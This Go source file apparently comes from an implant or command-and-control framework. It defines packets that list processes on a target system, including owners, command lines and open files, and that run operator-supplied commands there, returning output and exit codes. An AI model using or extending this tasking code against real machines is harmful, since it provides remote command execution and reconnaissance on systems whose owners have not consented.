package action

import (
	"context"
	"io"
	"io/ioutil"
	"os/exec"
	"time"

	ps "github.com/shirou/gopsutil/process"

	"github.com/iDigitalFlame/xmt/xmt/com"
	"github.com/iDigitalFlame/xmt/xmt/data"
)

type list uint16
type execute uint16

// Process is a struct that contains process info related
// to the specified process ID.
type Process struct {
	PID      int32     `json:"pid"`
	PPID     int32     `json:"ppid"`
	Name     string    `json:"name"`
	Path     string    `json:"path"`
	Files    []string  `json:"files"`
	Create   time.Time `json:"create"`
	Cmdline  []string  `json:"cmdline"`
	Username string    `json:"username"`
}

// Command is a struct that contains paramaters and specifications
// for executing a command on a target system.
type Command struct {
	Args       []string
	Stdin      []byte
	Timeout    time.Duration
	Background bool

	ctx    context.Context
	cancel context.CancelFunc
}

func (list) Thread() bool {
	return false
}
func (execute) Thread() bool {
	return true
}
func (l list) List() *com.Packet {
	return l.ListEx(false)
}
func (l list) ListAll() *com.Packet {
	return l.ListEx(true)
}
func (list) ListEx(a bool) *com.Packet {
	n := &com.Packet{ID: uint16(ProcessList)}
	n.WriteBool(a)
	n.Close()
	return n
}
func (execute) Run(c *Command) *com.Packet {
	p := &com.Packet{ID: uint16(Execute)}
	c.MarshalStream(p)
	return p
}

// ReadStdin takes the data in the supplied reader and creates a byte
// array to be used in the sent command as the stdin.
func (c *Command) ReadStdin(r io.Reader) error {
	b, err := ioutil.ReadAll(r)
	if err != nil {
		return err
	}
	c.Stdin = b
	return nil
}

// MarshalStream writes this Process struct data to the supplied Writer.
func (p *Process) MarshalStream(w data.Writer) error {
	if err := w.WriteInt32(p.PID); err != nil {
		return err
	}
	if err := w.WriteInt32(p.PPID); err != nil {
		return err
	}
	if err := w.WriteString(p.Name); err != nil {
		return err
	}
	if err := w.WriteString(p.Path); err != nil {
		return err
	}
	if err := w.WriteString(p.Username); err != nil {
		return err
	}
	if err := w.WriteInt64(p.Create.Unix()); err != nil {
		return err
	}
	if err := data.WriteStringList(w, p.Cmdline); err != nil {
		return err
	}
	if err := data.WriteStringList(w, p.Files); err != nil {
		return err
	}
	return nil
}

// MarshalStream writes this Command struct data to the supplied Writer.
func (c *Command) MarshalStream(w data.Writer) error {
	if err := w.WriteBool(c.Background); err != nil {
		return err
	}
	if err := w.WriteUint16(uint16(c.Timeout / time.Millisecond)); err != nil {
		return err
	}
	if err := data.WriteStringList(w, c.Args); err != nil {
		return err
	}
	if err := w.WriteBytes(c.Stdin); err != nil {
		return err
	}
	return nil
}

// UnmarshalStream read this Process struct data from the supplied Reader.
func (p *Process) UnmarshalStream(r data.Reader) error {
	if err := r.ReadInt32(&(p.PID)); err != nil {
		return err
	}
	if err := r.ReadInt32(&(p.PPID)); err != nil {
		return err
	}
	if err := r.ReadString(&(p.Name)); err != nil {
		return err
	}
	if err := r.ReadString(&(p.Path)); err != nil {
		return err
	}
	if err := r.ReadString(&(p.Username)); err != nil {
		return err
	}
	t, err := r.Int64()
	if err != nil {
		return err
	}
	p.Create = time.Unix(t, 0)
	if err := data.ReadStringList(r, &(p.Cmdline)); err != nil {
		return err
	}
	if err := data.ReadStringList(r, &(p.Files)); err != nil {
		return err
	}
	return nil
}

// UnmarshalStream read this Command struct data from the supplied Reader.
func (c *Command) UnmarshalStream(r data.Reader) error {
	if err := r.ReadBool(&(c.Background)); err != nil {
		return err
	}
	t, err := r.Uint16()
	if err != nil {
		return err
	}
	c.Timeout = time.Duration(t) * time.Millisecond
	if err := data.ReadStringList(r, &(c.Args)); err != nil {
		return err
	}
	if c.Stdin, err = r.Bytes(); err != nil {
		return err
	}
	return nil
}
func query(x context.Context, a bool, c *ps.Process) *Process {
	p := &Process{
		PID: c.Pid,
	}
	p.Path, _ = c.ExeWithContext(x)
	p.Name, _ = c.NameWithContext(x)
	p.PPID, _ = c.PpidWithContext(x)
	p.Username, _ = c.UsernameWithContext(x)
	p.Cmdline, _ = c.CmdlineSliceWithContext(x)
	if t, err := c.CreateTimeWithContext(x); err == nil {
		p.Create = time.Unix(t, 0)
	}
	if a {
		if f, err := c.OpenFilesWithContext(x); err == nil && len(f) > 0 {
			p.Files = make([]string, len(f))
			for x := range f {
				p.Files[x] = f[x].Path
			}
		}
	}
	return p
}
func (list) Execute(s Session, r data.Reader, w data.Writer) error {
	a, err := r.Bool()
	if err != nil {
		return nil
	}
	l, err := ps.Processes()
	if err != nil {
		return err
	}
	if err := w.WriteUint64(uint64(len(l))); err != nil {
		return err
	}
	for i := range l {
		p := query(s.Context(), a, l[i])
		if err := p.MarshalStream(w); err != nil {
			return err
		}
	}
	return nil
}
func (execute) Execute(s Session, r data.Reader, w data.Writer) error {
	e := new(Command)
	if err := e.UnmarshalStream(r); err != nil {
		return err
	}
	if e.Timeout > 0 {
		e.ctx, e.cancel = context.WithTimeout(s.Context(), e.Timeout)
	} else {
		e.ctx, e.cancel = context.WithCancel(s.Context())
	}
	var p *exec.Cmd
	if len(e.Args) == 1 {
		p = exec.CommandContext(e.ctx, e.Args[0])
	} else {
		p = exec.CommandContext(e.ctx, e.Args[0], e.Args[1:]...)
	}
	if !e.Background {
		p.Stdout = w
		p.Stderr = w
	}
	if len(e.Stdin) > 0 {
		i, err := p.StdinPipe()
		if err != nil {
			e.cancel()
			return err
		}
		if _, err := i.Write(e.Stdin); err != nil {
			e.cancel()
			return err
		}
		if err := i.Close(); err != nil {
			e.cancel()
			return err
		}
	}
	if err := p.Start(); err != nil {
		e.cancel()
		return err
	}
	w.WriteBool(e.Background)
	w.WriteUint64(uint64(p.Process.Pid))
	if e.Background {
		go func(x *exec.Cmd, f context.CancelFunc) {
			x.Wait()
			f()
		}(p, e.cancel)
		return nil
	}
	defer e.cancel()
	err := p.Wait()
	w.WriteInt32(int32(p.ProcessState.ExitCode()))
	return err
}
